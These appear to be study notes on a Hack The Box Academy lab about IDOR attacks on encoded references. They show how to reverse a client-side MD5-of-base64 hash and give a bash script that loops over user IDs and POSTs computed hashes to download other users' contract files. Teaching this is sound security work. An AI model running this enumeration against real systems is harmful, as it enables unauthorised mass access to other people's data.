# Bypassing Encoded References - [LINK](https://academy.hackthebox.com/app/module/134/section/1187)


When object references are passed via POST requests or obscured using hashes/encoding, mass enumeration requires you to first deobfuscate or reverse-engineer the parameter generation logic.

**Reversing Front-End Hashing (Function Disclosure)**
Many modern JavaScript frameworks improperly handle sensitive logic on the client-side. If a POST request transmits a hash (e.g., `contract=cdd96d3cc73d1dbdaffa03cc6cd7339b`), check the page source for the function generating it.

*Example Front-End Function:*

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}

```

* `btoa(uid)`: Base64 encodes the user ID.
* `CryptoJS.MD5()`: Computes the MD5 hash of that base64 string.

**Replicating the Hash in the Terminal**
To test this logic, replicate it using Bash.
*Note: Use `echo -n` and `base64 -w 0` to prevent trailing newline characters from completely altering the resulting MD5 hash.*

```bash
# Base64 encode the number '1' and MD5 hash the result
echo -n 1 | base64 -w 0 | md5sum

```

If your output matches the hash captured in Burp Suite, you have successfully reversed the obfuscation. The object reference is now predictable, turning it into an exploitable IDOR.

**Automated POST Request Enumeration Script**
Once you know how to generate valid hashes for arbitrary `uid`s, you can automate the data extraction using a bash script that iterates through the IDs, generates the required hash, and submits the POST request.

* `curl -sOJ`: Silently download (`-s`), save the remote file with its original name (`-O`), and use the remote header name (`-J`).
* `tr -d ' -'`: Strips the trailing dash and space outputted by `md5sum`.

```bash
#!/bin/bash

# Target endpoint
url="http://SERVER_IP:PORT/download.php"

# Loop through target user IDs (e.g., 1 to 100)
for i in {1..100}; do
    # Calculate the Base64 -> MD5 hash for the current ID
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        # Send the POST request with the calculated hash to download the file
        curl -sOJ -X POST -d "contract=$hash" $url
    done
done

```
